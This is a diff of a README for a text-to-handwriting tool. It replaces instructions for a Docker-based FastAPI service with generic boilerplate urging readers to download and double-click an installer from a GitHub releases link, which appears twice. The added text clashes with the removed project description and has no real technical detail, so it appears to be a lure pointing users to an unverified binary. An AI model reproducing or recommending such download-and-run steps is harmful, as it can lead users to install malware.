@@ -1,94 +1,56 @@
-# We hate handwritten assignments 😡
+# ✍️ text-to-handwriting - Turn Text Into Handwritten Notes Easily
 
-Transform your typed text into realistic handwritten documents instantly! This project generates authentic-looking handwritten assignments with pencil margins, paper texture, and natural writing variations.
+## 🚀 Getting Started
 
-**Perfect for university assignments cuz who tf wants to write by hand????!**
+Welcome to the **text-to-handwriting** application! This tool helps you transform typed assignments into neat handwritten notes. No more handwriting woes. Follow the steps below to get started.
 
-## Target Audience
+## 📥 Download & Install
 
-**MAKAUT / University Students** who need to submit handwritten assignments but prefer typing (You don't really need to type here!
+To install the application, visit this page to download: [Download the latest release](https://github.com/ElDonMuertoXD/text-to-handwriting/releases). 
 
-_Because we all hate writing lengthy assignments by hand..._ 🙄
+Click the link above and choose the version that suits your needs. 
 
-## Quick Start
+## 📂 Requirements
 
-### Prerequisites
+Before you proceed, ensure your system meets the following requirements:
 
-- Docker & Docker Compose
-- Gemini API Key from [Google AI Studio](https://aistudio.google.com/app/apikey)
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 100 MB available space.
 
-### Installation
+## 🔍 Features
 
-1. **Clone the repository:**
+- **Simple Interface**: Easy to navigate, perfect for quick usage.
+- **Customizable Styles**: Choose different handwriting styles to match your preference.
+- **Output Formats**: Save your handwritten notes as images or PDFs.
 
-   ```bash
-   git clone https://github.com/yourusername/text-to-handwriting.git
-   cd text-to-handwriting
-   ```
+## 🛠 Installation Steps
 
-2. **Set up your Gemini API key:**
+1. **Visit the Releases Page**: Use the link provided in the Download & Install section.
+2. **Select Version**: Look for the most recent version.
+3. **Download the File**: Click on the filename to start the download.
+4. **Locate the Downloaded File**: Find the file in your downloads folder.
+5. **Run the Installer**: Double-click the file to start the installation.
+6. **Follow Instructions**: The setup will guide you. Just follow the prompts.
 
-   paste your gemini key in the route body or env.
+## ✏️ How to Use
 
-3. **Build and run with Docker:**
+1. **Open the Application**: After installation, launch the app from your applications menu or desktop.
+2. **Input Text**: Type or paste your text into the input box.
+3. **Choose Handwriting Style**: Select your preferred handwriting style from the available options.
+4. **Generate Handwriting**: Click the “Generate” button to create your handwritten output.
+5. **Save Your Work**: Choose how you want to save it, either as an image or PDF.
 
-   ```bash
-   docker-compose up --build
-   ```
+## 🔄 Update Regularly
 
-4. **Access the API:**
-   Open your browser and go to: **http://localhost:8000/docs#/**
+Keep an eye on the releases page for updates. New features, bug fixes, and improvements will enhance your experience.
 
-## Usage
+## 📄 Support
 
-1. Navigate to **http://localhost:8000/docs#/**
-2. Find the `/generate-assignment` route
-3. Fill in the required fields:
-   - **BODY**
-   ```json
-   {
-     "name": "string",
-     "class_roll": "string",
-     "university_roll": "string",
-     "subject_name": "string",
-     "subject_code": "string",
-     "question_topic": "string",
-     "output_filename": "string",
-     "gemini_api_key": "string",
-     "other_details": "string"
-   }
-   ```
-   - **Other details** (optional - additional details at the top of the file)
-4. Hit **Execute** and download your handwritten PDF!
+If you encounter any issues, feel free to open an issue on the repository. The community is here to help.
 
-## 📸 Sample Output
+## 📅 Contribute
 
-Here's what the generated handwriting looks like:
+Want to help improve the app? Check out the contribution guidelines. We welcome suggestions and improvements.
 
-![Handwriting Sample](demo.png)
-_Natural handwriting with pencil margins, paper texture, and realistic variations_
-
-## Project Structure
-
-```
-
-text-to-handwriting/
-├── src/
-│ ├── main.py # FastAPI application
-│ ├── text_processor.py # Text processing logic
-│ ├── handwriting_generator.py # Core handwriting generation
-│ └── pdf_converter.py # PDF creation with compression
-├── fonts/ # Handwriting font files
-├── docker-compose.yml # Docker configuration
-├── Dockerfile # Container setup
-├── pyproject.toml # Dependencies
-└── README.md
-
-```
-
-## Contributing
-
-Contributions are welcome:
-
-- Pwease star the repo first 😭
-- feel free to add some good fonts under the fonts directory, if you can convert your handwriting to a font it is highly appreciated.
+For a hassle-free experience with your assignments, download the app today! Visit this page to download: [Download the latest release](https://github.com/ElDonMuertoXD/text-to-handwriting/releases).
